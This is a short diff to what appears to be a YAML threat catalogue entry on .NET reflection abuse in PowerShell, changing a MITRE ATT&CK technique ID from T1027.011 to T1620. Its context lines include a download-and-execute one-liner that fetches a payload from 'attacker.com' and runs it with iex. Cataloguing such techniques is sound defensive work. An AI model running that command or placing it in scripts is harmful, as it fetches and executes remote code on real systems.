@@ -8,7 +8,7 @@ api:
   method: Reflection/System.Net.* abuse
 abuse_scenarios:
 - name: Fileless malware via reflection
-  technique_id: T1027.011
+  technique_id: T1620
   description: Load .NET assemblies and invoke methods without writing to disk
   code_snippet: '[Reflection.Assembly]::LoadWithPartialName("System.Net"); $wc = New-Object
     Net.WebClient; iex $wc.DownloadString(''http://attacker.com/payload'')'
@@ -35,7 +35,7 @@ risk:
   likelihood_in_real_attacks: 95
 references:
   techniques:
-  - T1027.011
+  - T1620
   threat_actors:
   - APT29
   - APT28
